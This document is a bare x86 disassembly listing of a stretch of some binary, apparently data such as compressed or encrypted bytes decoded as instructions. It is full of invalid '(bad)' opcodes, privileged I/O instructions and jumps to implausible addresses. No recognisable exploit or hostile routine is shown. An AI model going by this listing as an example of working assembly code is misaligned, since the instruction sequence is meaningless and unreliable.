  407d0c:	jge    0x407cb9
  407d0e:	daa    
  407d0f:	mul    DWORD PTR [edi]
  407d11:	cdq    
  407d12:	mov    ah,0x67
  407d14:	cs push esi
  407d16:	(bad)  
  407d17:	call   DWORD PTR [esi]
  407d19:	add    edx,DWORD PTR [edi+esi*8+0xf]
  407d1d:	rol    DWORD PTR [esi+0x35],0x95
  407d21:	inc    esi
  407d22:	(bad)  
  407d23:	call   DWORD PTR [edi]
  407d25:	ds xchg edx,eax
  407d27:	push   edi
  407d29:	xor    al,0x43
  407d2b:	je     0x407d36
  407d2d:	lods   eax,DWORD PTR ds:[esi]
  407d2e:	mov    ah,bl
	...
  407d40:	add    BYTE PTR [eax],al
  407d42:	(bad)  
  407d44:	inc    esi
  407d45:	add    al,0x65
  407d47:	ds inc esi
  407d49:	xor    BYTE PTR [edi-0x4e],ah
  407d4c:	arpl   di,si
  407d4e:	iret   
  407d4f:	add    BYTE PTR [edi+eiz*8-0xb941fb],dh
  407d56:	retf   
  407d57:	pop    ecx
  407d58:	cli    
  407d59:	mov    edi,0xb3ef073c
  407d5e:	xchg   edi,eax
  407d5f:	cmc    
  407d60:	pop    eax
  407d61:	inc    edi
  407d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d63:	inc    edi
  407d64:	ins    BYTE PTR es:[edi],dx
  407d65:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  407d67:	aas    
  407d68:	push   cs
  407d69:	icebp  
  407d6a:	xchg   edi,eax
  407d6b:	aas    
  407d6c:	jmp    0xf66acaf3
  407d71:	inc    esi
  407d72:	xchg   DWORD PTR [esi],eax
  407d74:	jge    0x407d3b
  407d76:	jb     0x407cf9
  407d78:	std    
  407d79:	dec    esi
  407d7a:	ja     0x407dbb
  407d7c:	jmp    0x9cc46250
  407d81:	pop    ebx
  407d82:	pop    edi
  407d83:	aas    
  407d84:	(bad)  
  407d85:	add    esp,esp
  407d87:	mov    dl,0x42
  407d89:	add    al,0x65
  407d8b:	mov    DWORD PTR [ecx+0x193f4f4e],esp
  407d91:	inc    edi
  407d92:	jge    0x407dbe
  407d94:	mov    esi,0x1b2e3f46
  407d99:	xor    DWORD PTR [edi],esi
  407d9b:	aas    
  407d9c:	repnz inc ebx
  407d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d9f:	fisubr DWORD PTR [ecx-0x78]
  407da2:	dec    eax
  407da3:	aaa    
  407da4:	xchg   esi,eax
  407da5:	inc    esi
	...
  407db6:	add    BYTE PTR [eax],al
  407db8:	lock mov edx,0x3f17dc21
  407dbe:	xchg   esi,eax
  407dbf:	test   DWORD PTR [edi],ecx
  407dc1:	mov    ecx,0x728f5bf0
  407dc6:	jbe    0x407e0e
  407dc8:	(bad)  
  407dc9:	js     0x407e48
  407dcb:	dec    esi
  407dcc:	idiv   DWORD PTR [esi]
  407dce:	data16 shl bh,1
  407dd1:	mov    cs:0x563ee797,al
  407dd7:	nop
  407dd8:	enter  0x4e36,0x46
  407ddc:	xlat   BYTE PTR ds:[ebx]
  407ddd:	mov    ah,0xf0
  407ddf:	pop    ebx
  407de0:	popf   
  407de1:	imul   edi,DWORD PTR [esi],0x46
  407de4:	(bad)  
  407de5:	je     0x407de7
  407de7:	adc    DWORD PTR [esi],ebp
  407de9:	jmp    FWORD PTR ds:[esi]
  407dec:	pusha  
  407ded:	and    esi,edi
  407def:	es ss ds jne 0x407de5
  407df4:	dec    ebx
  407df5:	lods   al,BYTE PTR ds:[esi]
  407df6:	stos   DWORD PTR es:[edi],eax
  407df7:	push   ss
  407df8:	ss ds mov ch,0x9
  407dfc:	es inc DWORD PTR ds:[esi]
  407e00:	mov    al,ds:0x5fd0e806
  407e05:	ds push esi
  407e08:	outs   dx,DWORD PTR ds:[esi]
  407e09:	and    esi,edi
  407e0b:	out    dx,al
  407e0c:	sub    eax,0xb596952f
  407e11:	cmp    eax,0x35c894ff
  407e16:	call   esi
  407e18:	mov    esp,0xceaf90
	...
  407e2d:	add    BYTE PTR [ebp-0x422e4ac3],ch
  407e33:	cmp    eax,0x6d2dd1ff
  407e38:	push   DWORD PTR [esi-0x490f8c4b]
  407e3e:	lods   eax,DWORD PTR ds:[esi]
  407e3f:	cmp    eax,0x3e851de8
  407e44:	call   FWORD PTR [esi+0x2be93667]
  407e4a:	mov    dh,0x3d
  407e4c:	dec    DWORD PTR [esi+0x47e84227]
  407e52:	jae    0x407e5b
  407e54:	add    BYTE PTR [eax+0x1c000eb2],dh
  407e5a:	jns    0x407e86
  407e5c:	and    DWORD PTR [ebp-0xa8ac260],0x4b
  407e63:	aad    0x7f
  407e65:	jmp    0x51860e5d
  407e6a:	xor    eax,0x8e41f7b4
  407e6f:	ins    BYTE PTR es:[edi],dx
  407e70:	inc    DWORD PTR [eax]
  407e72:	ss ret 0xfc44
  407e76:	push   es
  407e77:	dec    esi
  407e78:	sti    
  407e79:	(bad)  
  407e7a:	jl     0x407e4d
  407e7c:	(bad)  
  407e7d:	jne    0x407e14
  407e7f:	loope  0x407e97
  407e81:	mov    ebx,0xc00ac3d6
  407e86:	jge    0x407e8b
  407e88:	mov    DWORD PTR [ebp-0x3],eax
  407e8b:	pusha  
  407e8c:	dec    DWORD PTR [esp+ecx*2+0xff4fcd]
	...
  407ea3:	add    BYTE PTR [esi+eax*8],cl
  407ea6:	out    0x7b,eax
  407ea8:	ffree  st(3)
  407eaa:	dec    BYTE PTR [ebx]
  407eac:	leave  
  407ead:	push   esi
  407eae:	sub    BYTE PTR [eax-0x77],ch
  407eb1:	cmp    esi,ebp
  407eb3:	mov    esi,0xe8074c56
  407eb8:	jo     0x407e58
  407eba:	(bad)  
  407ebb:	inc    DWORD PTR [esi+0x4c]
  407ebe:	idiv   edi
  407ec0:	mov    esp,0x4175fe3e
  407ec5:	loope  0x407e87
  407ec7:	stos   DWORD PTR es:[edi],eax
  407ec8:	xchg   dl,al
  407eca:	(bad)  
  407ecb:	jne    0x407f4a
  407ecd:	ret    0xfc74
  407ed0:	xchg   BYTE PTR [edi+eax*1-0x18],cl
  407ed4:	retf   0xff9e
  407ed7:	inc    DWORD PTR [esi+0x75e8fb4c]
  407edd:	xchg   ebx,eax
  407ede:	(bad)  
  407edf:	call   DWORD PTR [eax-0x39]
  407ee2:	pop    es
  407ee3:	add    ah,ch
  407ee5:	mov    edi,0xe14d83eb
  407eea:	push   ebp
  407eeb:	(bad)  
  407eec:	cld    
  407eed:	xor    al,0xe7
  407eef:	lods   eax,DWORD PTR ds:[esi]
  407ef0:	mov    edx,0x190bfec2
  407ef5:	dec    ebp
  407ef6:	add    al,0x5e
  407ef8:	and    dh,al
  407efa:	pop    es
  407efb:	add    al,dh
  407efd:	mov    ds:0xcd40efbd,al
  407f02:	int    0xb
  407f04:	fsub   DWORD PTR [ebp-0x71]
  407f07:	inc    DWORD PTR [eax]
	...
  407f19:	add    bh,al
  407f1b:	cmp    DWORD PTR [ebx+0xf],eax
  407f1e:	je     0x407ef8
  407f20:	add    al,BYTE PTR [eax]
  407f22:	lock in al,dx
  407f24:	int    0xfb
  407f26:	cwde   
  407f27:	stc    
  407f28:	xchg   esp,eax
  407f29:	jmp    DWORD PTR [edi-0x60144249]
  407f2f:	fwait
  407f30:	inc    edi
  407f31:	call   FWORD PTR ds:0x8875433a
  407f37:	push   ss
  407f38:	push   edx
  407f39:	scas   al,BYTE PTR es:[edi]
  407f3a:	xchg   DWORD PTR ds:0x98c7577,edi
  407f40:	mov    edx,0xc276ef67
  407f45:	inc    ebp
  407f47:	push   ebp
  407f48:	lds    eax,FWORD PTR [eax-0x3ff1d210]
  407f4e:	in     eax,0x2f
  407f50:	cs cmp eax,0x6ac5e6b
  407f56:	or     edi,ebp
  407f58:	add    ebp,eax
  407f5a:	ins    DWORD PTR es:[edi],dx
  407f5b:	std    
  407f5c:	add    eax,DWORD PTR [eax]
  407f5e:	repz jge 0x407eee
  407f61:	jne    0x407fab
  407f63:	(bad)  
  407f64:	sbb    DWORD PTR [ecx],edi
  407f66:	mov    cl,0x2d
  407f68:	(bad)  
  407f6a:	pop    es
  407f6b:	scas   eax,DWORD PTR es:[edi]
  407f6c:	add    eax,DWORD PTR [eax]
  407f6e:	jmp    0x407fdd
  407f70:	mov    ecx,0x8d390b01
  407f75:	adc    BYTE PTR [esi],dh
  407f77:	add    edx,DWORD PTR cs:[eax-0x5e]
  407f7b:	mov    esp,0xe7b8
	...
  407f90:	(bad)  
  407f91:	cmp    cl,BYTE PTR [ebx]
  407f93:	call   0xff832b91
  407f98:	dec    edx
  407f99:	pop    es
  407f9a:	ror    DWORD PTR [ebx+0x41f8700],0x65
  407fa1:	jns    0x407f64
  407fa3:	add    al,0x0
  407fa5:	sub    al,0x8f
  407fa7:	inc    ebx
  407fa8:	inc    ebp
  407fa9:	sqrtps xmm2,XMMWORD PTR [eax-0x66]
  407fad:	cmp    edi,DWORD PTR [esi]
  407faf:	inc    ebx
  407fb0:	inc    ebp
  407fb1:	cmp    esi,DWORD PTR [esi]
  407fb3:	mov    ecx,0xbb43bcb
  407fb8:	cwde   
  407fb9:	xor    dl,BYTE PTR [ebx+0x43]
  407fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fbd:	cmp    edx,DWORD PTR [edi+ebp*1+0x4346e988]
  407fc4:	xchg   edi,eax
  407fc5:	mov    DWORD PTR [ebx+esi*1+0x779a2f20],esp
  407fcc:	xchg   DWORD PTR [ebx],edi
  407fce:	adc    al,BYTE PTR [esi+ebx*1]
  407fd1:	dec    esi
  407fd2:	sub    ecx,DWORD PTR [eax+esi*8]
  407fd5:	shl    DWORD PTR [ecx+0x30],1
  407fd8:	jae    0x40801c
  407fda:	in     eax,0xad
  407fdc:	lods   eax,DWORD PTR ds:[si]
  407fde:	repz inc edx
  407fe0:	in     eax,0xe
  407fe2:	rol    esi,0x8a
  407fe5:	cmp    ecx,esi
  407fe7:	mov    WORD PTR [ebp+0x857513a],?
  407fed:	(bad)  
  407fee:	call   0xc14f4535
  407ff3:	push   0x0
	...
  408005:	add    BYTE PTR [ebx+edi*1],dh
  408008:	scas   al,BYTE PTR es:[edi]
  408009:	lods   eax,DWORD PTR ds:[esi]
  40800a:	das    
  40800b:	mov    ds:0x6b0fcd3,eax
  408010:	adc    DWORD PTR ds:0x42e8c5d9,ebx
  408016:	(bad)  [ecx+0x230fc4bf]
  40801c:	test   DWORD PTR [ebx+0x7],esi
  40801f:	cmp    esi,edx
  408021:	inc    ebx
  408022:	test   BYTE PTR [eax],ah
  408024:	add    BYTE PTR [ecx],al
  408026:	mov    al,0xfe
  408028:	inc    eax
  408029:	jmp    0x9908a2f1
  40802e:	xor    bh,BYTE PTR [edx]
  408030:	push   eax
  408031:	mov    ecx,0x4107b432
  408036:	push   cs
  408037:	cmp    edi,edi
  408039:	dec    esi
  40803a:	sbb    eax,DWORD PTR [ecx-0x53]
  40803d:	inc    esi
  40803e:	xor    ch,BYTE PTR [ebp+0x74e15119]
  408044:	push   DWORD PTR [esi]
  408046:	out    0x46,al
  408048:	je     0x40804e
  40804a:	pop    esp
  40804b:	sub    bh,BYTE PTR [eax]
  40804d:	test   al,0xf3
  40804f:	(bad)  
  408050:	out    0x4a,eax
  408052:	and    al,0x3a
  408054:	inc    DWORD PTR [ecx-0x16bf0129]
  40805a:	mov    ds:0x32389822,eax
  40805f:	cmp    dl,BYTE PTR [eax-0x67]
  408062:	xor    dh,BYTE PTR [edi+eax*1-0xc701ff]
  408069:	out    dx,al
	...
  40807a:	add    BYTE PTR [eax],al
  40807c:	sbb    dl,BYTE PTR [ecx-0x534e1953]
  408082:	sbb    edx,ecx
  408084:	shl    BYTE PTR [edi-0x1],cl
  408087:	(bad)  
  408088:	in     eax,0x46
  40808a:	je     0x408090
  40808c:	pushf  
  40808d:	sub    bh,BYTE PTR [eax]
  40808f:	sub    ah,ch
  408091:	(bad)  
  408092:	out    0x3a,eax
  408094:	ret    
  408095:	cmp    edi,edi
  408097:	inc    ecx
  408098:	mov    al,0xfe
  40809a:	inc    eax
  40809b:	jmp    0x58a8a2e3
  4080a0:	mov    cl,0x39
  4080a2:	push   eax
  4080a3:	cmp    DWORD PTR [ecx+0x6d8107b3],esi
  4080a9:	cmp    edi,edi
  4080ab:	mov    ds,esp
  4080ad:	mov    al,ds:0xc86e00ac
  4080b2:	imul   esp,DWORD PTR [ebx],0xffb0b561
  4080b8:	jle    0x4080c5
  4080ba:	shl    BYTE PTR [esp+esi*4+0x6d],0xef
  4080bf:	cmp    BYTE PTR [eax-0x7517affb],bl
  4080c5:	mov    ah,0xfe
  4080c7:	push   DWORD PTR [ecx-0x26bec807]
  4080cd:	push   ebp
  4080ce:	out    0x38,eax
  4080d0:	dec    eax
  4080d1:	enter  0x50fe,0x59
  4080d5:	(bad)  
  4080d6:	je     0x4080e0
  4080d8:	xor    DWORD PTR [ebp+edi*8-0x1],edx
  4080dc:	fsubp  st(2),st
  4080de:	xor    eax,0xad
	...
  4080ef:	add    BYTE PTR [eax],al
  4080f1:	add    dh,cl
  4080f3:	(bad)  
  4080f4:	(bad)  
  4080f5:	jne    0x4080f4
  4080f7:	(bad)  
  4080f8:	je     0x408102
  4080fa:	icebp  
  4080fb:	lods   eax,DWORD PTR ds:[esi]
  4080fc:	test   eax,0xc1cdfeff
  408101:	add    al,0x99
  408103:	push   eax
  408104:	mov    ch,ah
  408106:	or     bh,cl
  408108:	fcomi  st,st(7)
  40810a:	jle    0x4080d2
  40810c:	mov    WORD PTR [ebp+0x5d],es
  40810f:	push   ebp
  408110:	(bad)  
  408111:	jne    0x40817c
  408113:	(bad)  
  408114:	je     0x408122
  408116:	inc    ecx
  408117:	jbe    0x408197
  408119:	add    BYTE PTR [ecx+0xa],cl
  40811c:	ror    BYTE PTR [edi],0xd4
  40811f:	xchg   DWORD PTR [ecx],eax
  408121:	add    BYTE PTR [ecx-0x32],bl
  408124:	inc    esp
  408125:	clc    
  408126:	dec    ecx
  408127:	add    eax,0x40860000
  40812c:	repz call DWORD PTR [esi]
  40812f:	add    eax,0x6b196a00
  408134:	jmp    FWORD PTR [ecx+0x9]
  408137:	imul   edi,edi,0xffffff8c
  40813a:	lock jmp 0xf736:0xa27d5037
  408142:	pop    es
  408143:	adc    bl,0xfe
  408146:	test   DWORD PTR [edi-0x790b8ac0],eax
  40814c:	ret    0xf07e
  40814f:	sub    eax,0x2b5cc00c
  408154:	sub    al,BYTE PTR [ecx+0x0]
	...
  408166:	add    BYTE PTR [eax],al
  408168:	icebp  
  408169:	sub    eax,0x6b66803
  40816e:	ret    
  40816f:	dec    esi
  408171:	push   ebx
  408172:	adc    ebp,eax
  408174:	dec    esp
  408175:	mov    esi,0xb520ff3f
  40817a:	push   edx
  40817b:	lea    ebp,[ebp-0x6]
  40817e:	aaa    
  40817f:	jmp    FWORD PTR [edi+0x3ce7d59e]
  408185:	fidivr WORD PTR [edi]
  408187:	jmp    FWORD PTR [ecx-0x5d]
  40818a:	xor    dh,bh
  40818c:	xchg   edi,eax
  40818d:	adc    DWORD PTR [ebx],ebp
  40818f:	stos   BYTE PTR es:[edi],al
  408190:	pop    esp
  408191:	or     DWORD PTR [eax+0x6a],eax
  408194:	lock xchg ebp,eax
  408196:	into   
  408197:	cmp    BYTE PTR [ecx],dh
  408199:	cs inc eax
  40819b:	mov    ch,0x80
  40819d:	cmp    DWORD PTR [edi],edi
  40819f:	jmp    FWORD PTR [edi-0x4d]
  4081a2:	push   cs
  4081a3:	call   0xff80133d
  4081a8:	imul   esp,DWORD PTR [ebx+0x5157f727],0xefd7ffaa
  4081b2:	cld    
  4081b3:	inc    eax
  4081b4:	lock inc eax
  4081b6:	jns    0x4081a8
  4081b8:	inc    edi
  4081b9:	jns    0x4081fa
  4081bb:	(bad)  
  4081bc:	mov    ebp,0x5f922b21
  4081c1:	imul   edi,DWORD PTR [edi],0x89076d89
  4081c7:	aaa    
  4081c8:	pop    ds
  4081c9:	cmp    BYTE PTR [ebx],dl
  4081cb:	add    al,0x0
	...
  4081dd:	add    BYTE PTR [eax+0xfc4cff9],cl
  4081e3:	cmp    DWORD PTR [esp+esi*1-0x1],edx
  4081e7:	aaa    
  4081e8:	xchg   BYTE PTR [edi],bh
  4081ea:	test   DWORD PTR [edx],ecx
  4081ec:	xchg   ecx,eax
  4081ed:	mov    bh,0x46
  4081ef:	cmp    BYTE PTR [esi-0x73],dh
  4081f2:	jne    0x40821e
  4081f4:	jbe    0x408235
  4081f6:	out    0xac,eax
  4081f8:	call   0xa83eb5a8
  4081fd:	add    edx,edi
  4081ff:	jno    0x40825a
  408201:	aaa    
  408202:	iret   
  408203:	aaa    
  408204:	dec    esi
  408205:	mov    ecx,0x6ea52efb
  40820a:	mov    edi,0xc8897037
  40820f:	das    
  408210:	ss aas 
  408212:	sbb    al,BYTE PTR [edi]
  408214:	shl    DWORD PTR [ebx+0x3ee8c5e8],0x65
  40821b:	ss push ss
  40821d:	aas    
  40821e:	xchg   edi,eax
  40821f:	aaa    
  408220:	pushf  
  408221:	sets   ch
  408224:	cmp    eax,0x6c8d873f
  408229:	pusha  
  40822a:	xchg   DWORD PTR [edi],esi
  40822c:	inc    BYTE PTR [edx+0x3efe2235]
  408232:	outs   dx,DWORD PTR ds:[esi]
  408233:	push   es
  408234:	je     0x408242
  408236:	jae    0x4082b1
  408238:	leave  
  408239:	ss pop edi
  40823b:	aaa    
  40823c:	jmp    0x94c44ef8
  408241:	das    
	...
  408252:	add    BYTE PTR [eax],al
  408254:	inc    edi
  408255:	aaa    
  408256:	into   
  408257:	add    edi,DWORD PTR [edx+ebx*8+0x2f488069]
  40825e:	mov    esi,0xffb2f03e
  408263:	sbb    DWORD PTR [edi+esi*1-0x1],ebx
  408267:	mov    esi,0xf17537a5
  40826c:	retf   
  40826d:	mov    ebx,0x37d69ea7
  408272:	mov    ch,0x85
  408274:	(bad)  
  408275:	aaa    
  408276:	dec    DWORD PTR [esi-0x491800b8]
  40827c:	mov    esi,DWORD PTR [edi]
  40827e:	(bad)  
  40827f:	jle    0x4082f9
  408281:	div    DWORD PTR cs:[esi+0x2e]
  408285:	ss jne 0x408269
  408288:	sbb    ecx,DWORD PTR [eax-0x58]
  40828b:	pushw  ds
  40828d:	ss mov ch,0x45
  408290:	push   ds
  408291:	call   DWORD PTR ss:[esi-0x78]
  408295:	push   cs
  408296:	call   0xff76de35
  40829b:	inc    esi
  40829c:	cmp    BYTE PTR [edi],ah
  40829e:	idiv   DWORD PTR [esi]
  4082a0:	div    BYTE PTR ds:0x6bdbe175
  4082a6:	test   al,0x2e
  4082a8:	out    0x35,al
  4082aa:	mov    ch,0x45
  4082ac:	out    0x35,al
  4082ae:	call   FWORD PTR [esi]
  4082b0:	pop    eax
  4082b1:	push   cs
  4082b2:	call   0xff769e35
  4082b7:	push   cs
	...
  4082c8:	add    BYTE PTR [eax],al
  4082ca:	or     BYTE PTR [ebx],ch
  4082cc:	test   DWORD PTR [esi],0x52a11ebe
  4082d2:	mov    dh,0x35
  4082d4:	(bad)  
  4082d5:	cmp    al,0x13
  4082d7:	ds (bad) 
  4082d9:	out    dx,al
  4082da:	sbb    bl,BYTE PTR [ebp+0x361de6ab]
  4082e0:	mov    ch,0xcd
  4082e2:	sbb    eax,0x79c1ff36
  4082e7:	(bad)  
  4082e8:	dec    esi
  4082ea:	add    eax,0x7e00e87c
  4082ef:	hlt    
  4082f0:	(bad)  
  4082f1:	call   0x3f22bf
  4082f6:	mov    si,0xf7db
  4082fa:	push   esi
  4082fb:	hlt    
  4082fc:	out    0x75,eax
  4082fe:	ret    0xfef3
  408301:	(bad)  
  408302:	mov    esp,0x66fff6fa
  408307:	hlt    
  408308:	je     0x408316
  40830a:	jbe    0x40838a
  40830c:	pop    es
  40830d:	call   0x3f7746
  408312:	jbe    0x4082d1
  408314:	out    dx,eax
  408315:	mul    DWORD PTR [esi-0xc]
  408318:	out    0x59,eax
  40831a:	xor    dh,ah
  40831c:	(bad)  
  40831d:	dec    DWORD PTR [ecx+esi*8-0xbc8ae18]
  408324:	(bad)  
  408325:	jmp    FWORD PTR [ebp+esi*8+0x9b4a3e7]
  40832c:	add    cl,cl
	...
  40833e:	add    BYTE PTR [eax],al
  408340:	or     edx,DWORD PTR [edi]
  408342:	add    BYTE PTR [ebp+0x42],dl
  408345:	test   DWORD PTR [edx-0x9f1a3c],0x74f2bf69
  40834f:	or     BYTE PTR [ecx],al
  408351:	pusha  
  408352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408353:	push   esi
  408355:	add    DWORD PTR [ebp-0x4],0x41385f71
  40835c:	cdq    
  40835d:	popa   
  40835e:	add    DWORD PTR [eax],eax
  408360:	mov    DWORD PTR [ecx-0x1e7e8a01],ecx
  408366:	idiv   ch
  408368:	repnz addr16 pushw 0xffa0
  40836d:	dec    eax
  40836e:	(bad)  
  40836f:	(bad)  
  408370:	cld    
  408371:	sub    BYTE PTR gs:[ecx+0x49],al
  408375:	bnd je 0x408380
  408378:	lock inc edi
  40837a:	daa    
  40837b:	std    
  40837c:	inc    edi
  40837d:	inc    esp
  40837e:	cmp    al,0x75
  408380:	cmp    al,0x4c
  408382:	mov    dh,0x7
  408384:	dec    eax
  408385:	cmc    
  408386:	imul   edi,edi,0x2f
  408389:	inc    cx
  40838b:	add    al,0xf0
  40838d:	sbb    cl,BYTE PTR [ecx+0x5f6371ec]
  408393:	not    DWORD PTR [edi]
  408395:	xchg   esp,eax
  408396:	mov    es,WORD PTR [ebp+0xc]
  408399:	out    dx,eax
  40839a:	cmp    al,0x75
  40839c:	loopne 0x408322
  40839e:	mov    dh,0xb
  4083a0:	or     bl,ah
  4083a2:	mov    esi,0xff
	...
  4083b3:	add    BYTE PTR [eax],al
  4083b5:	add    bh,dh
  4083b7:	aaa    
  4083b8:	inc    ebx
  4083b9:	pcmpeqw mm7,mm4
  4083bc:	add    DWORD PTR [eax],eax
  4083be:	lock ins BYTE PTR es:[edi],dx
  4083c0:	(bad)  
  4083c1:	div    eax
  4083c3:	sbb    eax,0x6baf0003
  4083c8:	aaa    
  4083c9:	push   edi
  4083cb:	sbb    eax,0x47f06a03
  4083d0:	add    ebp,DWORD PTR [edx-0x10]
  4083d3:	push   edi
  4083d4:	add    ecx,DWORD PTR [ebp-0x732d05d3]
  4083da:	jne    0x4083ce
  4083dc:	xor    edi,edi
  4083de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083df:	mov    ?,WORD PTR [esi*2-0x44a1268]
  4083e6:	mov    BYTE PTR [esi+edi*4],bh
  4083e9:	dec    DWORD PTR [edi-0x128bbcd7]
  4083ef:	push   es
  4083f0:	add    BYTE PTR [ecx],0xf0
  4083f3:	sbb    eax,0x5ec8ddab
  4083f8:	add    edi,edi
  4083fa:	in     eax,0x4d
  4083fc:	sub    edi,DWORD PTR [ecx]
  4083fe:	xchg   esi,eax
  4083ff:	and    eax,0x76b503b
  408404:	mov    ecx,0xd63b6d89
  408409:	cmp    ecx,DWORD PTR [edi-0x29]
  40840c:	cmp    ch,BYTE PTR [ecx+ebx*1]
  40840f:	gs into 
  408411:	cmp    ebp,DWORD PTR [ecx-0x76]
  408414:	mov    ecx,0xd1343733
  408419:	mov    ebx,0x0
	...
  40842a:	add    BYTE PTR [eax],al
  40842c:	pop    ecx
  40842d:	xor    al,0xb6
  40842f:	scas   al,BYTE PTR es:[edi]
  408430:	daa    
  408431:	lods   al,BYTE PTR ds:[esi]
  408432:	jnp    0x408431
  408434:	mov    al,0x6
  408436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408437:	jno    0x408459
  408439:	cmp    al,0x9e
  40843b:	cmp    ecx,DWORD PTR [edi]
  40843d:	mov    edx,0x62722be4
  408442:	mov    ?,WORD PTR [ebx]
  408444:	imul   ecx,DWORD PTR [edx+0x33f7338d],0x6e580413
  40844e:	mov    al,0xc4
  408450:	out    0x34,eax
  408452:	xor    al,0x34
  408454:	out    0x33,eax
  408456:	cmp    bx,WORD PTR [ebp+0x3]
  40845a:	push   ecx
  40845b:	mov    ds:0x8d56339c,eax
  408460:	ins    DWORD PTR es:[edi],dx
  408461:	es push esi
  408463:	cmp    edi,DWORD PTR [edi+0x5eabe8a0]
  408469:	in     eax,dx
  40846a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40846b:	add    ebp,DWORD PTR [edi-0x58ccc687]
  408471:	xor    ebp,DWORD PTR [esi]
  408473:	mov    cl,0xeb
  408475:	push   ds
  408476:	mov    ch,0x68
  408478:	xchg   edi,eax
  408479:	xor    esi,DWORD PTR [eax-0x7f]
  40847c:	pushf  
  40847d:	cmp    edx,DWORD PTR [esi]
  40847f:	cmp    ebx,DWORD PTR [edx]
  408481:	pop    es
  408482:	and    DWORD PTR [ecx+edi*4-0x3b],0x363d3ae8
  40848a:	idiv   BYTE PTR [edx]
  40848c:	outs   dx,DWORD PTR ds:[esi]
  40848d:	xor    eax,DWORD PTR [eax]
  40848f:	jl     0x408491
	...
  4084a1:	add    bh,ch
  4084a3:	push   ds
  4084a4:	xor    DWORD PTR [ebx+ebx*1],edi
  4084a7:	xor    al,0x89
  4084a9:	ins    BYTE PTR es:[edi],dx
  4084aa:	or     edi,DWORD PTR [edi+edi*8]
  4084ad:	ficomp WORD PTR [ebp+0x44af6733]
  4084b3:	(bad)  
  4084b4:	dec    ebp
  4084b6:	shl    BYTE PTR [esi],0xf7
  4084b9:	(bad)  
  4084ba:	cli    
  4084bb:	xor    esi,DWORD PTR [ebp-0x13]
  4084be:	fistp  DWORD PTR [ebp*4-0x7a82154a]
  4084c5:	(bad)  
  4084c6:	loop   0x4084fb
  4084c8:	jmp    FWORD PTR [edx-0x68]
  4084cb:	sub    dh,bh
  4084cd:	sahf   
  4084ce:	retf   0x7506
  4084d1:	loopne 0x408541
  4084d3:	jno    0x4084b5
  4084d5:	xchg   esi,eax
  4084d6:	mov    edx,0x50fd0033
  4084db:	mov    BYTE PTR [ebp-0xcddd73],bh
  4084e1:	jmp    0x2cc3537d
  4084e6:	or     edi,DWORD PTR [edx]
  4084e8:	jmp    DWORD PTR [esi-0xd]
  4084eb:	mov    edx,0x6f3d152
  4084f0:	out    dx,eax
  4084f1:	xchg   edi,eax
  4084f2:	or     bh,BYTE PTR [edi+eax*1-0x935cbf]
  4084f9:	inc    esi
  4084fa:	cli    
  4084fb:	jnp    0x4084e9
  4084fd:	ss jmp 0xa41e:0xfbbcff31
  408505:	xchg   DWORD PTR [eax],eax
	...
  408517:	add    dl,bl
  408519:	xor    edi,edi
  40851b:	pop    esp
  40851c:	retf   
  40851d:	cmp    edi,edi
  40851f:	push   ds
  408520:	retf   0x7bb
  408523:	add    DWORD PTR [ecx+0x69],esp
  408526:	dec    DWORD PTR [esi]
  408528:	mov    edx,0x7600e47b
  40852d:	lock (bad) 
  40852f:	jmp    esp
  408531:	std    
  408532:	out    0x88,eax
  408534:	mov    bh,0xec
  408536:	(bad)  
  408537:	jmp    DWORD PTR [esi+eiz*8]
  40853a:	idiv   bh
  40853c:	dec    esi
  40853d:	lock je 0x408548
  408540:	and    DWORD PTR [ecx-0x5b],esi
  408543:	call   FWORD PTR [esi]
  408545:	lock mov ah,0xdc
  408548:	es lock (bad) 
  40854b:	push   esp
  40854d:	add    ch,al
  40854f:	ins    BYTE PTR es:[edi],dx
  408550:	ja     0x408542
  408552:	(bad)  
  408553:	jmp    DWORD PTR [esi+eiz*8-0x1cb1000a]
  40855a:	jne    0x408505
  40855c:	dec    esi
  40855d:	lock (bad) 
  40855f:	mov    ch,0x79
  408561:	clc    
  408562:	(bad)  
  408563:	push   DWORD PTR [ecx+0x64]
  408566:	test   al,0xff
  408568:	outs   dx,BYTE PTR ds:[esi]
  408569:	lock mov ah,0xec
  40856c:	jbe    0x40855d
  40856e:	(bad)  
  40856f:	call   0x3f236d
  408574:	pop    esi
  408575:	mov    ds:0xf04ef7e7,al
  40857a:	out    0x55,eax
	...
  40858c:	add    BYTE PTR [eax],al
  40858e:	sub    bh,0xfe
  408591:	jmp    DWORD PTR [esi+ecx*8-0xa]
  408595:	call   FWORD PTR [esi]
  408597:	jecxz  0x4085e2
  408599:	test   eax,0xb5fef02e
  40859e:	stc    
  40859f:	idiv   esi
  4085a1:	(bad)  
  4085a2:	out    dx,al
  4085a3:	popa   
  4085a4:	or     edi,edi
  4085a6:	fs std 
  4085a8:	out    0x3d,eax
  4085aa:	iret   
  4085ab:	out    dx,eax
  4085ac:	(bad)  
  4085ad:	push   DWORD PTR [ebx+edi*8]
  4085b0:	idiv   bh
  4085b2:	out    dx,al
  4085b3:	loop   0x4085e2
  4085b5:	test   eax,0xff3918f0
  4085ba:	xor    eax,0x76512b18
  4085bf:	or     BYTE PTR [ecx],bh
  4085c1:	jmp    ebp
  4085c3:	xor    ebp,DWORD PTR [ebx]
  4085c5:	js     0x4085b2
  4085c7:	pop    ds
  4085c8:	add    ecx,ecx
  4085ca:	xor    dl,BYTE PTR [ebx+0x3]
  4085cd:	push   ebp
  4085ce:	imul   ebx,DWORD PTR [ebx-0x7c],0xffffffc4
  4085d2:	dec    esp
  4085d3:	aad    0x3
  4085d5:	push   0xffffffdf
  4085d7:	pop    eax
  4085d8:	scas   al,BYTE PTR es:[edi]
  4085d9:	pop    es
  4085da:	dec    eax
  4085db:	fbld   TBYTE PTR [ecx-0x1]
  4085de:	aaa    
  4085df:	mov    dh,0xbd
  4085e1:	sti    
  4085e2:	cwde   
  4085e3:	mov    edx,?
  4085e5:	inc    eax
  4085e6:	lock js 0x4085d7
  4085e9:	ins    BYTE PTR es:[edi],dx
  4085ea:	leave  
  4085eb:	fiadd  WORD PTR [ebx]
